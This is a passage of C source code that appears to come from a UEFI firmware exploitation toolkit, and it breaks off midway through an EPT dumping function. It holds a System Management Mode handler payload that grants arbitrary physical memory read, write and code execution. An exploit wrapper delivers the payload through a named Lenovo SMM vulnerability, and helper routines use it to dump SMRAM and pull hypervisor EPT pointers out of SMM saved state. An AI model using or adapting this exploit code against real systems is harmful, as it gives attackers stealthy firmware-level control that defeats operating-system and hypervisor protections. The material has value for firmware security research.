#include "stdafx.h"

#if !defined(strtoull)

// fucking Microsoft
#define strtoull _strtoui64

#endif

// make crt functions inline
#pragma intrinsic(memcpy)

#define PAGE_SIZE_2MB (2 * 1024 * 1024)

// SMM related model specific registers of Intel
#define IA32_SMRR_PHYSBASE  0x000001F2  // SMRR base address
#define IA32_SMRR_PHYSMASK  0x000001F3  // SMRR range mask
#define IA32_MTRRCAP        0x000000FE  // MTRR capabilities

// sysenter related model specific registers
#define IA32_SYSENTER_CS    0x00000174
#define IA32_SYSENTER_EIP   0x00000176
#define IA32_SYSENTER_ESP   0x00000175

// syscall related model specific registers
#define IA32_LSTAR          0xc0000082

// commands to smm_handler()
#define SMM_OP_NONE             0   // do nothing, just check for successful exploitation
#define SMM_OP_MEM_READ         1   // read physical memory from SMM
#define SMM_OP_MEM_WRITE        2   // write physical memory from SMM
#define SMM_OP_MEM_PAGE_READ    3   // read physical memory from SMM using page table remap
#define SMM_OP_MEM_PAGE_WRITE   4   // write physical memory from SMM using page table remap
#define SMM_OP_MEM_READ_BYTE    5   // read byte from physical memory
#define SMM_OP_MEM_READ_WORD    6   // read word from physical memory
#define SMM_OP_MEM_READ_DWORD   7   // read dword from physical memory
#define SMM_OP_MEM_WRITE_BYTE   8   // write byte to physical memory
#define SMM_OP_MEM_WRITE_WORD   9   // write word to physical memory
#define SMM_OP_MEM_WRITE_DWORD  10  // write dword to physical memory
#define SMM_OP_EXECUTE          11  // execute SMM code at specified physical address
#define SMM_OP_GET_SMRAM_ADDR   12  // return SMRAM region address
#define SMM_OP_GET_SMST_ADDR    13  // return EFI_SMM_SYSTEM_TABLE2 address
#define SMM_OP_GET_MEM_INFO     14  // return physical memory information
#define SMM_OP_TEST             15

// default size for TSEG/HSEG
#define SMRAM_SIZE 0x800000

// Top of Memory register address
#define MEM_TOM PCI_ADDR(0, 0, 0, 0xa0)

// Top of Low Usable DRAM register address
#define MEM_TOLUD PCI_ADDR(0, 0, 0, 0xbc)

// Top of Upper Usable DRAM register address
#define MEM_TOUUD PCI_ADDR(0, 0, 0, 0xa8)

// Root Complex Base Address register address
#define LPC_RCBA PCI_ADDR(0, 0x1f, 0, 0xf0)

// SPI interface registers offset for RCRB
#define SPIBAR 0x3800

// SPI protected range registers offsets for RCRB
#define PR0 SPIBAR + 0x74
#define PR1 SPIBAR + 0x78
#define PR2 SPIBAR + 0x7C
#define PR3 SPIBAR + 0x80
#define PR4 SPIBAR + 0x84

// UEFI boot script table opcodes
#define BOOT_SCRIPT_IO_WRITE_OPCODE                 0x00
#define BOOT_SCRIPT_IO_READ_WRITE_OPCODE            0x01
#define BOOT_SCRIPT_MEM_WRITE_OPCODE                0x02
#define BOOT_SCRIPT_MEM_READ_WRITE_OPCODE           0x03
#define BOOT_SCRIPT_PCI_CONFIG_WRITE_OPCODE         0x04
#define BOOT_SCRIPT_PCI_CONFIG_READ_WRITE_OPCODE    0x05
#define BOOT_SCRIPT_SMBUS_EXECUTE_OPCODE            0x06
#define BOOT_SCRIPT_STALL_OPCODE                    0x07
#define BOOT_SCRIPT_DISPATCH_OPCODE                 0x08
#define BOOT_SCRIPT_MEM_POLL_OPCODE                 0x09

#define EFI_SMM_LOCK_BOX_COMMUNICATION_GUID \
                {0x2a3cfebd, 0x27e8, 0x4d0a, {0x8b, 0x79, 0xd6, 0x88, 0xc2, 0xa3, 0xe1, 0xc0}}

static GUID gEfiSmmLockBoxCommunicationGuid[] = EFI_SMM_LOCK_BOX_COMMUNICATION_GUID;

typedef void (* SMM_PROC)(void);

#ifdef USE_RWDRV

// RWEverything driver can allocate only relatively small chunks of contiguous physical memory
#define MEM_IO_BUFF_LEN (PAGE_SIZE * 4)

#else

#define MEM_IO_BUFF_LEN PAGE_SIZE_2MB

#endif

typedef struct _SMM_HANDLER_CONTEXT
{
    unsigned int op;
    int status;    

    union
    {
        struct // for SMM_OP_MEM_READ, SMM_OP_MEM_WRITE, etc.
        {
            void *addr;
            unsigned int size;
            unsigned char data[];

        } mem;

        struct // for SMM_OP_MEM_READ_BYTE and SMM_OP_MEM_WRITE_BYTE
        {
            void *addr;
            unsigned char val;

        } byte;

        struct // for SMM_OP_MEM_READ_WORD and SMM_OP_MEM_WRITE_WORD
        {
            void *addr;
            unsigned short val;

        } word;

        struct // for SMM_OP_MEM_READ_DWORD and SMM_OP_MEM_WRITE_DWORD
        {
            void *addr;
            unsigned int val;

        } dword;

        struct // for SMM_OP_EXECUTE
        {
            SMM_PROC addr;

        } execute;

        struct // for SMM_OP_GET_SMRAM_ADDR
        {
            unsigned long long addr;

        } smram_addr;

        struct // for SMM_OP_GET_SMST_ADDR
        {
            unsigned long long addr;

        } smst_addr;        

        struct // for SMM_OP_TEST
        {
            unsigned long long val;

        } test;
    };

} SMM_HANDLER_CONTEXT,
*PSMM_HANDLER_CONTEXT;

// SMM saved state area offset for each CPU
#define SMM_SMI_ENTRY_CPU0 0x3f6800
#define SMM_SMI_ENTRY_CPU1 0x3f7000
#define SMM_SMI_ENTRY_CPU2 0x3f7800
#define SMM_SMI_ENTRY_CPU3 0x3f8000

// get SMM saved state area offset for given CPU
#define SMM_SMI_ENTRY(_cpu_) (SMM_SMI_ENTRY_CPU0 + (0x800 * (_cpu_)))

// SMM saved state area field offsets
#define SMM_SAVED_STATE_EPT_ENABLE  0x7ee0
#define SMM_SAVED_STATE_EPTP        0x7ed8
#define SMM_SAVED_STATE_CR3         0x7ff0

// get 4-KByte aligned EPT PML4 table address from EPTP value
#define EPT_BASE(_val_) ((_val_) & ~0xfff)

// get EPT paging-structure memory type: 0 = uncacheable (UC), 6 = write-back (WB)
#define EPT_CACHEABLE(_val_) (((_val_) & 6) == 6)

// get EPT page-walk length from EPTP
#define EPT_PAGE_WALK_LEN(_val_) ((((_val_) >> 3) & 7) + 1)

// check for valid SMRAM pointer
#define IS_SMRAM_PTR(_val_) ((unsigned long long)(_val_) >= TSEG && \
                             (unsigned long long)(_val_) < TSEG + SMRAM_SIZE)

// number of CPU to run SMM exploit
static unsigned long m_current_cpu = 0;
//--------------------------------------------------------------------------------------
// put SMM function into the separate executable section
#pragma code_seg("_SMM")

static void smm_handler(void *context)
{
    int status = -1;
    PSMM_HANDLER_CONTEXT ctx = (PSMM_HANDLER_CONTEXT)context;

    if (ctx->op == SMM_OP_NONE)
    {
        // do nothing
        status = 0;
    }
    else if (ctx->op == SMM_OP_MEM_READ)
    {
        // read physical memory
        memcpy(&ctx->mem.data, ctx->mem.addr, ctx->mem.size);

        status = 0;
    }
    else if (ctx->op == SMM_OP_MEM_WRITE)
    {
        // write physical memory
        memcpy(ctx->mem.addr, &ctx->mem.data, ctx->mem.size);

        status = 0;
    }    
    else if (ctx->op == SMM_OP_MEM_PAGE_READ ||
             ctx->op == SMM_OP_MEM_PAGE_WRITE)
    {
        unsigned long long cr3 = _cr3_get(), addr = 0;
        unsigned long long mem_addr = (unsigned long long)ctx->mem.addr;

        X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K *PML4_entry =
            (X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K *)(PML4_ADDRESS(cr3) + 
            PML4_INDEX(addr) * sizeof(unsigned long long));

        if (PML4_entry->Bits.Present)
        {
            X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K *PDPT_entry =
                (X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K *)(PFN_TO_PAGE(PML4_entry->Bits.PageTableBaseAddress) +
                PDPT_INDEX(addr) * sizeof(unsigned long long));

            if (PDPT_entry->Bits.Present)
            {
                // check for page size flag
                if ((PDPT_entry->Uint64 & PDPTE_PDE_PS) == 0)
                {
                    X64_PAGE_DIRECTORY_ENTRY_4K *PD_entry =
                        (X64_PAGE_DIRECTORY_ENTRY_4K *)(PFN_TO_PAGE(PDPT_entry->Bits.PageTableBaseAddress) +
                        PDE_INDEX(addr) * sizeof(unsigned long long));

                    if (PD_entry->Bits.Present)
                    {                        
                        // check for page size flag
                        if (PD_entry->Uint64 & PDPTE_PDE_PS)
                        {                                                                         
                            unsigned long long new_addr = XALIGN_DOWN(mem_addr, (1024 * 1024 * 2));                                                     
                            unsigned long long old_pfn = PD_entry->Bits.PageTableBaseAddress;
                            unsigned long long offset = mem_addr - new_addr;                                            

                            // set new PFN to map target physical page to virtual address space at 0x1000000
                            PD_entry->Bits.PageTableBaseAddress = PAGE_TO_PFN(new_addr);
                            
                            // flush TLB
                            _invlpg(addr);

                            // we can do memory reads or writes only within one 2 Mb virtual page
                            ctx->mem.size = min(ctx->mem.size, PAGE_SIZE_2MB - offset);                            

                            if (ctx->op == SMM_OP_MEM_PAGE_READ)
                            {
                                // read physical memory page
                                memcpy(&ctx->mem.data, (unsigned char *)addr + offset, ctx->mem.size);
                            }
                            else
                            {
                                // write physical memory page
                                memcpy((unsigned char *)addr + offset, &ctx->mem.data, ctx->mem.size);
                            }
                            
                            // restore old PFN
                            PD_entry->Bits.PageTableBaseAddress = old_pfn;                            

                            // flush TLB
                            _invlpg(addr);

                            status = 0;
                        }
                        else
                        {
                            status = 5;
                        }
                    }
                    else
                    {
                        status = 4;
                    }
                }
                else
                {
                    status = 3;
                }
            }
            else
            {
                status = 2;
            }
        }
        else
        {
            status = 1;
        }
    }
    else if (ctx->op == SMM_OP_MEM_READ_BYTE)
    {
        // read byte from physical memory
        ctx->byte.val = *(unsigned char *)ctx->byte.addr;

        status = 0;
    }
    else if (ctx->op == SMM_OP_MEM_READ_WORD)
    {
        // read word from physical memory
        ctx->word.val = *(unsigned short *)ctx->word.addr;

        status = 0;
    }
    else if (ctx->op == SMM_OP_MEM_READ_DWORD)
    {
        // read dword from physical memory
        ctx->dword.val = *(unsigned int *)ctx->dword.addr;

        status = 0;
    }
    else if (ctx->op == SMM_OP_MEM_WRITE_BYTE)
    {
        // write byte to physical memory
        *(unsigned char *)ctx->byte.addr = ctx->byte.val;

        status = 0;
    }
    else if (ctx->op == SMM_OP_MEM_WRITE_WORD)
    {
        // write word to physical memory
        *(unsigned short *)ctx->word.addr = ctx->word.val;

        status = 0;
    }
    else if (ctx->op == SMM_OP_MEM_WRITE_DWORD)
    {
        // write dword to physical memory
        *(unsigned int *)ctx->dword.addr = ctx->dword.val;

        status = 0;
    }
    else if (ctx->op == SMM_OP_EXECUTE)
    {
        // run specified code
        if (ctx->execute.addr)
        {
            ctx->execute.addr();
        }

        status = 0;
    }
    else if (ctx->op == SMM_OP_GET_SMRAM_ADDR)
    {
        // calculate SMRAM address by stack pointer value
        ctx->smram_addr.addr = (unsigned long long)&status;
        ctx->smram_addr.addr &= ~(unsigned long long)(SMRAM_SIZE - 1);

        status = 0;
    }
    else if (ctx->op == SMM_OP_GET_SMST_ADDR)
    {
        // calculate SMRAM address by stack pointer value
        unsigned long long smram_addr = (unsigned long long)&status;
        smram_addr &= ~(unsigned long long)(SMRAM_SIZE - 1);

        for (int i = 0; i < SMRAM_SIZE - PAGE_SIZE; i += 0x10)
        {
            // check for EFI_SMM_SYSTEM_TABLE2 header signature
            if (*(unsigned int *)(smram_addr + i) == 'TSMS' &&
                *(unsigned int *)(smram_addr + i + sizeof(int)) == 0)
            {
                ctx->smst_addr.addr = smram_addr + i;
                status = 0;

                break;
            }
        }        
    }    
    else if (ctx->op == SMM_OP_TEST)
    {
        // ...
    }

    ctx->status = status;    
}

#pragma code_seg()
//--------------------------------------------------------------------------------------
int test(void)
{
    int ret = -1;

    printf("**************************************\n");
    printf("Running tests...\n");

    /*
        Test physical memory read and write.
    */
    {
        unsigned long long addr = 0x1000, old = 0;
        unsigned long long val = 0x0807060504030201;

        if (!uefi_expl_phys_mem_read(addr, sizeof(old), (unsigned char *)&old))
        {
            printf(__FUNCTION__"() ERROR: uefi_expl_phys_mem_read() fails\n");
            goto _end;
        }

        printf(__FUNCTION__"(): Old value from 0x%llx is 0x%llx\n", addr, old);

        if (uefi_expl_phys_mem_write(addr, sizeof(val), (unsigned char *)&val))
        {
            unsigned int low = 0, high = 0;

            if (uefi_expl_phys_mem_read(addr, sizeof(low), (unsigned char *)&low) &&
                uefi_expl_phys_mem_read(addr + 4, sizeof(high), (unsigned char *)&high))
            {
                printf(__FUNCTION__"(): Readed values are 0x%.8x`%.8x\n", high, low);

                if (high == 0x08070605 && low == 0x04030201)
                {
                    ret = 0;
                }
            }
            else
            {
                printf(__FUNCTION__"() ERROR: uefi_expl_phys_mem_read() fails\n");
            }

            // restore overwritten memory
            uefi_expl_phys_mem_write(addr, sizeof(old), (unsigned char *)&old);
        }
        else
        {
            printf(__FUNCTION__"() ERROR: uefi_expl_phys_mem_write() fails\n");
        }
    }

    if (ret != 0)
    {
        fprintf(stderr, __FUNCTION__"(): Error in test #1\n");
        goto _end;
    }

    /*
        Test PCI config space and I/O ports API.
    */
    ret = -1;

    {
        unsigned int pci_addr = PCI_ADDR(0, 0, 0, 0);
        unsigned long long val = 0;

        val |= pci_addr;

        // read VID/DID of PCI device 00:00.0 (host bridge) manually using I/O ports
        if (uefi_expl_port_write(0xcf8, U32, val))
        {
            val = 0;

            if (uefi_expl_port_read(0xcfc, U32, &val))
            {
                unsigned short vid = (unsigned short)((val >> 0) & 0xffff),
                               did = (unsigned short)((val >> 16) & 0xffff);

                printf(__FUNCTION__"(): Host bridge VID = 0x%.4x, DID = 0x%.4x\n", vid, did);

                val = 0;

                if (uefi_expl_pci_read(pci_addr, U32, &val))
                {
                    if (vid == (unsigned short)((val >> 0) & 0xffff) &&
                        did == (unsigned short)((val >> 16) & 0xffff))
                    {
                        ret = 0;
                    }
                }
                else
                {
                    printf(__FUNCTION__"() ERROR: uefi_expl_pci_read() fails\n");
                }
            }
            else
            {
                printf(__FUNCTION__"() ERROR: uefi_expl_port_read() fails\n");
            }
        }
        else
        {
            printf(__FUNCTION__"() ERROR: uefi_expl_port_write() fails\n");
        }
    }

    if (ret != 0)
    {
        fprintf(stderr, __FUNCTION__"(): Error in test #2\n");
        goto _end;
    }

    /*
        Test memory alloc/free and virtual to physical address translation.
    */
    ret = -1;

    {
        unsigned long long addr = 0, phys_addr = 0;

        if (uefi_expl_mem_alloc(PAGE_SIZE, &addr, &phys_addr))
        {
            unsigned long long phys_addr_2 = 0;

            printf(__FUNCTION__"(): Memory allocated at address 0x%llx\n", addr);

            if (uefi_expl_phys_addr(addr, &phys_addr_2))
            {
                printf(__FUNCTION__"(): Physical address for 0x%llx is 0x%llx\n", addr, phys_addr_2);

                if (phys_addr == phys_addr_2)
                {
                    ret = 0;
                }
            }
            else
            {
                printf(__FUNCTION__"() ERROR: uefi_expl_phys_addr() fails\n");
            }

            if (!uefi_expl_mem_free(addr, PAGE_SIZE))
            {
                printf(__FUNCTION__"() ERROR: uefi_expl_mem_free() fails\n");
            }
        }
        else
        {
            printf(__FUNCTION__"() ERROR: uefi_expl_mem_alloc() fails\n");
        }
    }

    if (ret != 0)
    {
        fprintf(stderr, __FUNCTION__"(): Error in test #3\n");
        goto _end;
    }

    /*
        Test model specific registers.
    */
    ret = -1;

    {
        unsigned long long val_1 = 0, val_2 = 0;

        if (uefi_expl_msr_get(IA32_LSTAR, &val_1) && uefi_expl_msr_get(IA32_SYSENTER_EIP, &val_2))
        {
            printf(__FUNCTION__"(): IA32_LSTAR = 0x%llx\n", val_1);
            printf(__FUNCTION__"(): IA32_SYSENTER_EIP = 0x%llx\n", val_2);

            ret = 0;
        }
        else
        {
            printf(__FUNCTION__"() ERROR: uefi_expl_msr_get() fails\n");
        }
    }

    if (ret != 0)
    {
        fprintf(stderr, __FUNCTION__"(): Error in test #4\n");
        goto _end;
    }

_end:

    printf("TEST %s\n", (ret == 0) ? "SUCCESS" : "FAILS");
    printf("*****************************************\n");

    return ret;
}
//--------------------------------------------------------------------------------------
int exploit(PUEFI_EXPL_TARGET target, PSMM_HANDLER_CONTEXT context, unsigned int context_size, bool quiet)
{
    int ret = -1;
    unsigned long long addr = 0, phys_addr = 0;

    if (context_size == 0)
    {
        context_size = sizeof(SMM_HANDLER_CONTEXT);
    }

    context->status = -1;    

#ifdef WIN32

    SetThreadAffinityMask(GetCurrentThread(), 1 << m_current_cpu);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

#else

    // ...

#endif

    // copy SMM_HANDLER_CONTEXT to continious physical memory buffer
    if (uefi_expl_mem_alloc(context_size, &addr, &phys_addr))
    {
        if (uefi_expl_phys_mem_write(phys_addr, context_size, (unsigned char *)context))
        {
            // run exploit
            if (expl_lenovo_SystemSmmAhciAspiLegacyRt(target, smm_handler, (void *)phys_addr, quiet))
            {
                // read SMM_HANDLER_CONTEXT with data returned by smm_handler()
                if (uefi_expl_phys_mem_read(phys_addr, context_size, (unsigned char *)context))
                {                    
                    if (context->status == 0)
                    {
                        ret = 0;
                    }
                    else
                    {
                        printf("ERROR: smm_handler() returned status code %d\n", context->status);
                    }
                }
                else
                {
                    printf("ERROR: uefi_expl_mem_read() fails\n");
                }
            }
        }
        else
        {
            printf("ERROR: uefi_expl_mem_write() fails\n");
        }

        uefi_expl_mem_free(addr, context_size);
    }
    else
    {
        printf("ERROR: uefi_expl_mem_alloc() fails\n");
    }

#ifdef WIN32

    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);

#else

    // ...

#endif

    return ret;
}
//--------------------------------------------------------------------------------------
int phys_mem_read(
    PUEFI_EXPL_TARGET target, 
    void *addr, unsigned long long size, unsigned char *data, 
    const char *file_path)
{
    int ret = -1;
    int chunk_size = MEM_IO_BUFF_LEN;
    unsigned int context_size = XALIGN_UP(sizeof(SMM_HANDLER_CONTEXT) + chunk_size, PAGE_SIZE);
    unsigned long long total = 0, p = 0;

    PSMM_HANDLER_CONTEXT context = (PSMM_HANDLER_CONTEXT)malloc(context_size);
    if (context == NULL)
    {
        return -1;
    }

    FILE *f = NULL;

    if (file_path)
    {
        // create output file
        if ((f = fopen(file_path, "wb")) == NULL)
        {
            printf("ERROR: Unable to create output file \"%s\"\n", file_path);
            goto _end;
        }
    }

    memset(context, 0, context_size);
    context->op = SMM_OP_MEM_PAGE_READ;

    while (p < size)
    {
        unsigned int data_size = min(chunk_size, size - p);
    
        context->mem.addr = (unsigned char *)addr + p;
        context->mem.size = data_size;

        // read single chunk of memory
        if (exploit(target, context, context_size, true) != 0)
        {
            printf("ERROR: exploit() fails\n");
            goto _end;
        }

        data_size = context->mem.size;

        if (data)
        {
            // copy readed data to buffer
            memcpy(data + p, context->mem.data, data_size);
        }

        if (f)
        {
            // write readed data to file
            if (fwrite(context->mem.data, 1, data_size, f) != data_size)
            {
                printf("ERROR: fwrite() fails\n");
                goto _end;
            }
        }

        if (data == NULL && f == NULL)
        {
            // print memory dump to the console
            hexdump(context->mem.data, data_size, (unsigned long long)addr + p);
        }

        p += data_size;
        total += data_size;
    }

    ret = 0;

_end:

    if (f)
    {
        if (ret == 0)
        {
            printf("%lld bytes written to the \"%s\"\n", total, file_path);
        }        

        fclose(f);
    }

    free(context);

    return ret;
}
//--------------------------------------------------------------------------------------
int phys_mem_read_val(PUEFI_EXPL_TARGET target, void *addr, data_width size, void *val)
{
    SMM_HANDLER_CONTEXT context;
    memset(&context, 0, sizeof(context));

    if (size == U8)
    {
        context.op = SMM_OP_MEM_READ_BYTE;
        context.byte.addr = addr;
    }
    else if (size == U16)
    {
        context.op = SMM_OP_MEM_READ_WORD;
        context.word.addr = addr;
    }
    else if (size == U32)
    {
        context.op = SMM_OP_MEM_READ_DWORD;
        context.dword.addr = addr;
    }
    else
    {
        printf(__FUNCTION__"() ERROR: Invalid data size\n");
        return -1;
    }

    // run exploitation to read a value from physical memory
    if (exploit(target, &context, NULL, true) == 0)
    {
        if (size == U8)
        {
            *(unsigned char *)val = context.byte.val;
        }
        else if (size == U16)
        {
            *(unsigned short *)val = context.word.val;
        }
        else if (size == U32)
        {
            *(unsigned int *)val = context.dword.val;
        }

        return 0;
    }
    else
    {
        printf(__FUNCTION__"() ERROR: exploit() fails\n");
    }

    return -1;
}
//--------------------------------------------------------------------------------------
int phys_mem_write(
    PUEFI_EXPL_TARGET target, 
    void *addr, unsigned long long size, unsigned char *data, 
    const char *file_path)
{
    int ret = -1;
    int chunk_size = MEM_IO_BUFF_LEN;
    unsigned int context_size = XALIGN_UP(sizeof(SMM_HANDLER_CONTEXT) + chunk_size, PAGE_SIZE);
    unsigned long long total = 0, p = 0;

    if (data == NULL && file_path == NULL)
    {
        return -1;
    }

    PSMM_HANDLER_CONTEXT context = (PSMM_HANDLER_CONTEXT)malloc(context_size);
    if (context == NULL)
    {
        return -1;
    }

    FILE *f = NULL;

    if (file_path)
    {

#ifdef WIN32

        struct _stat file_info;

        // get file info on Windows
        if (_stat(file_path, &file_info) != 0)
#else
        struct stat file_info;

        // get file info on *nix
        if (stat(file_path, &file_info) != 0)
#endif
        {
            printf("ERROR: stat() fails for file \"%s\"\n", file_path);
            return -1;
        }

        if (file_info.st_size == 0)
        {
            printf("ERROR: \"%s\" file is empty\n", file_path);
            return -1;
        }

        // open input file
        if ((f = fopen(file_path, "rb")) == NULL)
        {
            printf("ERROR: Unable to open input file \"%s\"\n", file_path);
            goto _end;
        }

        size = file_info.st_size;
    }

    memset(context, 0, context_size);
    context->op = SMM_OP_MEM_PAGE_WRITE;

    while (p < size)
    {
        unsigned int data_size = min(chunk_size, size - p);

        context->mem.addr = (unsigned char *)addr + p;
        context->mem.size = data_size;

        if (file_path)
        {
            if (fseek(f, p, SEEK_SET) != 0)
            {
                printf("ERROR: fseek() fails\n");
                goto _end;
            }

            // read data from file
            if (fread(context->mem.data, 1, data_size, f) != data_size)
            {
                printf("ERROR: fread() fails\n");
                goto _end;
            }
        }
        else if (data)
        {
            // copy data from buffer
            memcpy(context->mem.data, data + p, data_size);
        }

        // write single chunk of memory
        if (exploit(target, context, context_size, true) != 0)
        {
            printf("ERROR: exploit() fails\n");
            goto _end;
        }

        data_size = context->mem.size;

        p += data_size;
        total += data_size;
    }

    ret = 0;

_end:

    if (f)
    {
        if (ret == 0)
        {
            printf("%lld bytes written from the \"%s\"\n", total, file_path);
        }

        fclose(f);
    }

    free(context);

    return ret;
}
//--------------------------------------------------------------------------------------
int phys_mem_write_val(PUEFI_EXPL_TARGET target, void *addr, data_width size, void *val)
{
    SMM_HANDLER_CONTEXT context;
    memset(&context, 0, sizeof(context));

    if (size == U8)
    {
        context.op = SMM_OP_MEM_WRITE_BYTE;
        context.byte.addr = addr;
        context.byte.val = *(unsigned char *)val;
    }
    else if (size == U16)
    {
        context.op = SMM_OP_MEM_WRITE_WORD;
        context.word.addr = addr;
        context.word.val = *(unsigned short *)val;
    }
    else if (size == U32)
    {
        context.op = SMM_OP_MEM_WRITE_DWORD;
        context.dword.addr = addr;
        context.dword.val = *(unsigned int *)val;
    }
    else
    {
        printf(__FUNCTION__"() ERROR: Invalid data size\n");
        return -1;
    }

    // run exploitation to write a value from physical memory
    if (exploit(target, &context, NULL, true) == 0)
    {                
        return 0;
    }
    else
    {
        printf(__FUNCTION__"() ERROR: exploit() fails\n");
    }

    return -1;
}
//--------------------------------------------------------------------------------------
unsigned long long smram_addr(PUEFI_EXPL_TARGET target)
{

#ifdef USE_SMRR

    unsigned long long val = 0;
    
    if (uefi_expl_msr_get(IA32_MTRRCAP, &val))
    {
        // check if IA32_SMRR_PHYSBASE and IA32_SMRR_PHYSMASK are available (11 bit)
        if (val & 0x800 == 0)
        {
            printf(__FUNCTION__"() ERROR: SMRR is not supported on this system\n");
            return 0;
        }

        if (uefi_expl_msr_get(IA32_SMRR_PHYSBASE, &val))
        {
            // get PhysBase field of IA32_SMRR_PHYSBASE, bits 12 through 31
            return val & 0xFFFFF000;
        }
        else
        {
            printf(__FUNCTION__"() ERROR: uefi_expl_msr_get() fails\n");
        }
    }
    else
    {
        printf(__FUNCTION__"() ERROR: uefi_expl_msr_get() fails\n");
    }    
 
#else // USE_SMRR

    SMM_HANDLER_CONTEXT context;
    memset(&context, 0, sizeof(context));
    context.op = SMM_OP_GET_SMRAM_ADDR;

    // run exploitation to get SMRAM address
    if (exploit(target, &context, NULL, false) == 0)
    {
        return context.smram_addr.addr;
    }
    else
    {
        printf(__FUNCTION__"() ERROR: exploit() fails\n");
    }

#endif // USE_SMRR

    return 0;
}
//--------------------------------------------------------------------------------------
unsigned long long smst_addr(PUEFI_EXPL_TARGET target)
{
    SMM_HANDLER_CONTEXT context;
    memset(&context, 0, sizeof(context));
    context.op = SMM_OP_GET_SMST_ADDR;

    // run exploitation to get EFI_SMM_SYSTEM_TABLE2 address
    if (exploit(target, &context, NULL, true) == 0)
    {
        return context.smst_addr.addr;
    }
    else
    {
        printf(__FUNCTION__"() ERROR: exploit() fails\n");
    }

    return 0;
}
//--------------------------------------------------------------------------------------
bool eptp_info(
    PUEFI_EXPL_TARGET target, 
    unsigned int cpu_num, unsigned long long addr,
    unsigned int *ept_enable, unsigned long long *eptp, unsigned long long *cr3)
{    
    #define SAVED_STATE_READ(_offs_, _val_, _len_)                          \
                                                                            \
        phys_mem_read(                                                      \
            target,                                                         \
            (void *)(addr + (_offs_)), (_len_), (unsigned char *)(_val_),   \
            NULL)    

    if (ept_enable)
    {
        if (SAVED_STATE_READ(
            SMM_SMI_ENTRY(cpu_num) + SMM_SAVED_STATE_EPT_ENABLE, ept_enable, sizeof(unsigned int)) != 0)
        {
            printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
            return false;
        }
    }

    if (eptp)
    {
        if (SAVED_STATE_READ(
            SMM_SMI_ENTRY(cpu_num) + SMM_SAVED_STATE_EPTP, eptp, sizeof(unsigned long long)) != 0)
        {
            printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
            return false;
        }
    }

    if (cr3)
    {
        if (SAVED_STATE_READ(
            SMM_SMI_ENTRY(cpu_num) + SMM_SAVED_STATE_CR3, cr3, sizeof(unsigned long long)) != 0)
        {
            printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
            return false;
        }
    }
       
    return true;
}
//--------------------------------------------------------------------------------------
#define EPT_FIND_MAX_ITEMS 0x100
#define EPT_FIND_ATTEMPTS 500 
#define EPT_FIND_WAIT 1

bool ept_find(
    PUEFI_EXPL_TARGET target,
    int *items_found, unsigned long long **ept, unsigned long long *vmm_cr3)
{
    // determinate SMRAM address
    unsigned long long addr = smram_addr(target);
    if (addr == 0)
    {
        printf(__FUNCTION__"() ERROR: smram_addr() fails\n");
        return false;
    }

    printf("SMRAM is at 0x%llx:0x%llx\n", addr, addr + SMRAM_SIZE - 1);

    int items_size = EPT_FIND_MAX_ITEMS * sizeof(unsigned long long);
    unsigned long long *items = (unsigned long long *)malloc(items_size);
    if (items == NULL)
    {
        return false;
    }    

    memset(items, 0, items_size);

    *ept = items;
    *items_found = 0;
    *vmm_cr3 = 0;

#ifdef WIN32

    SYSTEM_INFO sys_info;
    GetSystemInfo(&sys_info);

    unsigned int cpu_count = sys_info.dwNumberOfProcessors;

#else

    // ...

#endif 

    printf("%d logical processors found\n", cpu_count);

    for (int n = 0; n < EPT_FIND_ATTEMPTS; n += 1)
    {
        for (unsigned int cpu_num = 0; cpu_num < cpu_count; cpu_num += 1)
        {
            unsigned int ept_enable = 0;
            unsigned long long eptp = 0, cr3 = 0;

            // get EPT information for each logical CPU
            if (!eptp_info(target, cpu_num, addr, &ept_enable, &eptp, &cr3))
            {
                printf(__FUNCTION__"() ERROR: eptp_info() fails\n");
                return false;
            }

            if (EPT_BASE(eptp) == 0)
            {
                // no EPT present
                continue;
            }

            if (ept_enable == 0)
            {
                // VMX root operation mode
                *vmm_cr3 = cr3;
            }
            else if (ept_enable == 1)
            {
                // VMX non root operation mode
            }
            else
            {
                // unexpected EPT enable value
                continue;
            }
            
            // save EPT address
            for (int i = 0; i < EPT_FIND_MAX_ITEMS; i += 1)
            {
                if (items[i] == eptp)
                {
                    // value is already known
                    break;
                }
                else if (items[i] == 0)
                {
                    // it's a new value
                    items[i] = eptp;
                    *items_found = *items_found + 1;
                    break;
                }
            }
        }

#ifdef WIN32

        Sleep(EPT_FIND_WAIT);
#else
        // ...
#endif

    }

    return true;
}
//--------------------------------------------------------------------------------------
#define EPT_R(_val_) (((_val_) & 1) == 1)
#define EPT_W(_val_) (((_val_) & 2) == 2)
#define EPT_X(_val_) (((_val_) & 4) == 4)

#define EPT_PRESENT(_val_) (((_val_) & 7) != 0)

int ept_dump(PUEFI_EXPL_TARGET target, unsigned long long pml4_addr, const char *file_path)
{
    FILE *fd = NULL;
    X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K *PML4_page = NULL, *PDPT_page = NULL;
    X64_PAGE_DIRECTORY_ENTRY_4K *PD_page = NULL;
    X64_PAGE_TABLE_ENTRY_4K *PT_page = NULL;
    
    if ((PML4_page = (X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K *)malloc(PAGE_SIZE)) == NULL)
    {
        goto _end;
    }

    if ((PDPT_page = (X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K *)malloc(PAGE_SIZE)) == NULL)
    {
        goto _end;
    }

    if ((PD_page = (X64_PAGE_DIRECTORY_ENTRY_4K *)malloc(PAGE_SIZE)) == NULL)
    {
        goto _end;
    }

    if ((PT_page = (X64_PAGE_TABLE_ENTRY_4K *)malloc(PAGE_SIZE)) == NULL)
    {
        goto _end;
    }    

    if (file_path)
    {
        if ((fd = fopen(file_path, "w")) == NULL)
        {
            printf(__FUNCTION__"() ERROR: fopen() fails\n");
            goto _end;
        }
    }    

    // read PML4 memory page
    if (phys_mem_read(
        target, (void *)PML4_ADDRESS(pml4_addr), 
        PAGE_SIZE, (unsigned char *)PML4_page, NULL) != 0)
    {
        printf(__FUNCTION__"() ERROR: phys_mem_read() fails\n");
        goto _end;
